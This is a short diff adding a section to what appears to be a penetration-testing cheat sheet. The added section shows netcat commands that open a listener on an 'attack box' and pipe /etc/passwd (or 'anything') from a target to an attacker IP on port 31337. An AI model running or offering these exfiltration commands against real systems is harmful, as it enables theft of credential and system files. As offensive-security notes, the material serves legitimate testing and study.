@@ -50,3 +50,10 @@ done
 grep -r --include "*.h" "get_return_address" .
 # --include "*.h" --> search files ending in .h
 ```
+### exfil /etc/passwd (OR ANYTHING) with nc
+```bash
+# set up listner on attack box, port 31337. Direct output to exfil.txt
+nc -nvlp 31337 > exfil.txt
+# on the target, use
+nc <attacker_ip_addr> 31337 < /etc/passwd
+```
